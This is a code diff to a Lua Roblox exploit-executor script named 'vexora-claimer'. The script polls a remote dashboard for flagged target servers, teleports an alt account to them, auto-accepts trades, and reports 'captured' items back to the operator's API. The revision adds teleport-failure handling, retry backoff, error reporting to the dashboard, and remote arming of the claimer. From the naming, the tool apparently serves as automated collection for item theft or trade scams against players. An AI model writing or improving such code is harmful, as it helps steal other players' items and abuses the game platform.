@@ -6,7 +6,7 @@
   back after every teleport.
 ]]
 
-local CLAIMER_REV = "1.2"
+local CLAIMER_REV = "1.3"
 local API_BASE = "{{API_BASE}}"
 local API_KEY = "{{API_KEY}}"
 local ENDPOINT = "{{ENDPOINT}}"
@@ -17,6 +17,8 @@ local TRADE_DELAY = 2          -- seconds between trade attempts
 local STAY_SECONDS = 240       -- how long to farm a server before chasing a new target
 local AUTO_ACCEPT = true       -- accept incoming trade requests
 local REPORT_ITEMS = true      -- post captured items to the dashboard
+local TELEPORT_TIMEOUT = 8     -- seconds to wait for Roblox to actually leave the server
+local JOIN_BACKOFF_MAX = 30    -- longest retry pause after a refused teleport
 
 -- persisted across reloads by the executor
 local settings = (getgenv and getgenv().VexoraClaimerSettings) or {}
@@ -25,7 +27,9 @@ if settings.autoAccept == nil then settings.autoAccept = AUTO_ACCEPT end
 settings.enabled = settings.autoExecute
 if getgenv then getgenv().VexoraClaimerSettings = settings end
 
-local ui = { state = "starting", polls = 0, target = nil, lastCapture = nil }
+local ui = { state = "starting", polls = 0, target = nil, lastCapture = nil, error = nil, joinError = nil }
+local joinBackoff = 0
+local nextJoinAt = 0
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -34,6 +38,7 @@ local LocalPlayer = Players.LocalPlayer
 local ME = LocalPlayer and LocalPlayer.Name or "unknown"
 local HERE = game.JobId ~= "" and game.JobId or nil
 local PLACE = game.PlaceId
+local TeleportService = game:GetService("TeleportService")
 
 local GAME_MAP = {
     [142823291] = "mm2",
@@ -110,6 +115,14 @@ local function heartbeat(state, target, err)
             target = target,
             error = err,
         })
+    end)
+end
+
+-- the in-game switch is the control the person actually sees. keep the dashboard
+-- master switch in sync instead of expecting a second click on another device.
+local function setDashboardArmed(armed)
+    pcall(function()
+        http("POST", API_BASE .. "/api/claimer/" .. (armed and "arm" or "disarm"))
     end)
 end
 
@@ -299,6 +312,9 @@ local function startTrading(target)
     trading = true
     arrivedAt = os.time()
     ui.state = "trading"
+    ui.joinError = nil
+    joinBackoff = 0
+    nextJoinAt = 0
     ui.target = target or ui.target
     heartbeat("trading", target and target.server_id)
     print(string.format("[vexora-claimer] arrived in %s | target %s | %s trade remotes",
@@ -377,31 +393,112 @@ local function queueSelf()
     end
 end
 
+local teleportError = nil
+
+local function noteTeleportFailure(player, result, message)
+    if player and player ~= LocalPlayer then return end
+    teleportError = tostring(message or result or "teleport failed")
+    ui.joinError = teleportError
+    print("[vexora-claimer] teleport failed: " .. teleportError)
+end
+
+pcall(function() TeleportService.TeleportInitFailed:Connect(noteTeleportFailure) end)
+
+-- a refused teleport never throws in most executors; it arrives later through
+-- TeleportInitFailed. release the dashboard job immediately so the next poll can
+-- retry instead of sitting on a 90 second lease.
+local function reportJoinFailure(target, message)
+    if not target or not target.id then return end
+    pcall(function()
+        http("POST", API_BASE .. "/api/claimer/target/" .. encode(target.id) .. "/failed", {
+            server_id = HERE,
+            account = ME,
+            error = tostring(message or "teleport failed"):sub(1, 180),
+            retry = true,
+        })
+    end)
+end
+
 local function joinTarget(target)
-    if not target or not target.place_id or not target.server_id then return false end
-    raiseIdentity()
-    queueSelf()
-    ui.state = "joining"
-    heartbeat("joining", target.server_id)
-
-    local teleport = game:GetService("TeleportService")
-    local placeId = tonumber(target.place_id)
-    local attempts = {
-        function() teleport:TeleportToPlaceInstance(placeId, target.server_id, LocalPlayer) end,
-        function() teleport:TeleportToPlaceInstance(placeId, target.server_id) end,
-        function() teleport:Teleport(placeId, LocalPlayer) end,
-    }
-
-    for index, attempt in ipairs(attempts) do
-        local ok, err = pcall(attempt)
-        print(string.format("[vexora-claimer] teleport %d/%d -> %s", index, #attempts,
-            ok and ("joining " .. tostring(target.server_id)) or tostring(err)))
-        if ok then return true end
-        task.wait(1)
+    if not target or not target.place_id or not target.server_id then
+        return false, "target is missing its place or server id"
+    end
+    if os.time() < nextJoinAt then
+        return false, string.format("retry in %ds", math.ceil(nextJoinAt - os.time()))
     end
 
-    print("[vexora-claimer] teleport refused - the dashboard lease expires in 90s and retries")
-    return false
+    local placeId = tonumber(target.place_id)
+    if not placeId then return false, "target has an invalid place id" end
+
+    raiseIdentity()
+    queueSelf()
+    teleportError = nil
+    ui.state = "joining"
+    ui.joinError = nil
+    heartbeat("joining", target.server_id)
+
+    local beforeJob, beforePlace = game.JobId, game.PlaceId
+
+    -- only real targeted calls. a plain Teleport(placeId) would drop the alt in
+    -- a random server and look like it never moved to the flagged one.
+    local attempts = {
+        function() TeleportService:TeleportToPlaceInstance(placeId, target.server_id, LocalPlayer) end,
+        function() TeleportService:TeleportToPlaceInstance(placeId, target.server_id) end,
+    }
+
+    local started, lastError = false, nil
+    for index, attempt in ipairs(attempts) do
+        local ok, err = pcall(attempt)
+        print(string.format("[vexora-claimer] teleport %d/%d -> place %s server %s", index, #attempts,
+            tostring(placeId), tostring(target.server_id)))
+        if ok then started = true; break end
+        lastError = tostring(err)
+        print("[vexora-claimer] teleport call failed: " .. lastError)
+        task.wait(0.5)
+    end
+
+    if not started then
+        local message = lastError or "TeleportToPlaceInstance is unavailable"
+        reportJoinFailure(target, message)
+        joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
+        nextJoinAt = os.time() + joinBackoff
+        ui.state = "failed"
+        ui.joinError = message
+        return false, message
+    end
+
+    -- wait for the real answer. the client usually closes within a second on a
+    -- successful join; if it is still sitting here after the timeout, the call
+    -- was silently dropped.
+    local waited = 0
+    while waited < TELEPORT_TIMEOUT and running do
+        task.wait(0.5)
+        waited = waited + 0.5
+        if teleportError then break end
+        if game.JobId ~= beforeJob or game.PlaceId ~= beforePlace then
+            joinBackoff = 0
+            nextJoinAt = 0
+            return true
+        end
+    end
+
+    local failure = teleportError
+    teleportError = nil
+    if failure then
+        reportJoinFailure(target, failure)
+        joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
+        nextJoinAt = os.time() + joinBackoff
+        ui.state = "failed"
+        ui.joinError = failure
+        return false, failure
+    end
+
+    reportJoinFailure(target, "teleport did not start")
+    joinBackoff = math.min(JOIN_BACKOFF_MAX, joinBackoff > 0 and joinBackoff * 2 or 5)
+    nextJoinAt = os.time() + joinBackoff
+    ui.state = "failed"
+    ui.joinError = "teleport did not start"
+    return false, "teleport did not start"
 end
 
 --[[ ---- poll loop ---- ]]
@@ -418,11 +515,25 @@ local function getTarget()
         return nil
     end
     if res.status == 401 then
+        ui.state = "failed"
+        ui.error = "api key rejected - regenerate it on the dashboard"
+        heartbeat("failed", nil, ui.error)
         print("[vexora-claimer] api key rejected - regenerate it on the dashboard")
         return nil
     end
+    if res.status == 403 then
+        ui.state = "failed"
+        ui.error = (type(res.body) == "table" and res.body.error)
+            or "this account is not allowed to use the auto claimer"
+        heartbeat("failed", nil, ui.error)
+        print("[vexora-claimer] poll 403: " .. tostring(ui.error))
+        return nil
+    end
     if res.status ~= 200 or type(res.body) ~= "table" then
-        print("[vexora-claimer] poll http " .. tostring(res.status))
+        ui.state = "failed"
+        ui.error = "poll http " .. tostring(res.status)
+        heartbeat("failed", nil, ui.error)
+        print("[vexora-claimer] " .. ui.error)
         return nil
     end
     local body = res.body
@@ -430,6 +541,7 @@ local function getTarget()
     if body.target then ui.target = body.target end
     ui.state = body.paused and "paused" or (body.target and "target" or "polling")
     if body.paused then
+        ui.error = "joiner is off on the dashboard"
         heartbeat("paused")
     elseif body.target then
         heartbeat("target", body.target.server_id)
@@ -560,6 +672,7 @@ local function buildUi()
     toggleRow("Auto claimer", 66, settings.enabled, function(value)
         settings.enabled = value
         ui.state = value and "polling" or "off"
+        setDashboardArmed(value)
         if uiApi.update then uiApi.update() end
     end)
     toggleRow("Auto execute on load", 98, settings.autoExecute, function(value)
@@ -621,15 +734,17 @@ local function buildUi()
     uiApi.update = function()
         if not frame.Parent then return end
         stateLabel.Text = string.format("%s  ·  %s", tostring(ui.state), ME)
-        stateLabel.TextColor3 = (ui.state == "offline" or ui.state == "off") and off or ink
+        stateLabel.TextColor3 = (ui.state == "offline" or ui.state == "off" or ui.state == "failed")
+            and off or ink
         local target = ui.target
         targetLabel.Text = target
             and string.format("%s  (%s)  %s", tostring(target.item or "?"),
                 tostring(target.value or "?"), tostring(target.server_id or ""):sub(1, 10))
             or "no target yet"
         captureLabel.Text = ui.error and ("error: " .. tostring(ui.error):sub(1, 46))
+            or (ui.joinError and ("join: " .. tostring(ui.joinError):sub(1, 42))
             or (ui.lastCapture and ("captured: " .. ui.lastCapture)
-            or ("polls: " .. tostring(ui.polls) .. "  ·  " .. GAME))
+            or ("polls: " .. tostring(ui.polls) .. "  ·  " .. GAME)))
         footer.Text = "api " .. API_BASE
     end
 
@@ -643,11 +758,20 @@ print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s
 print(string.format("[vexora-claimer] trading=%s poll=%ds stay=%ds remotes=%d/%d",
     tostring(trading), POLL_SECONDS, STAY_SECONDS, #tradeRemotes, #acceptRemotes))
 heartbeat("starting")
+-- executing the claimer with auto execute on should arm the dashboard too, not
+-- leave a second switch to find on another device.
+setDashboardArmed(settings.enabled)
 if uiApi.update then pcall(uiApi.update) end
 
 task.spawn(function()
     while running do
-        local payload = settings.enabled and getTarget() or nil
+        local payload = nil
+        if settings.enabled and os.time() >= nextJoinAt then
+            payload = getTarget()
+        elseif settings.enabled then
+            ui.state = "waiting"
+            heartbeat("waiting", nil, ui.joinError)
+        end
         if not settings.enabled then ui.state = "off" end
         if payload then
             if payload.paused then
@@ -664,9 +788,8 @@ task.spawn(function()
                         end)
                     end
                 elseif not trading or (os.time() - arrivedAt) >= STAY_SECONDS then
-                    if joinTarget(target) then
-                        return
-                    end
+                    local joined = joinTarget(target)
+                    if joined then return end
                 end
             end
         end
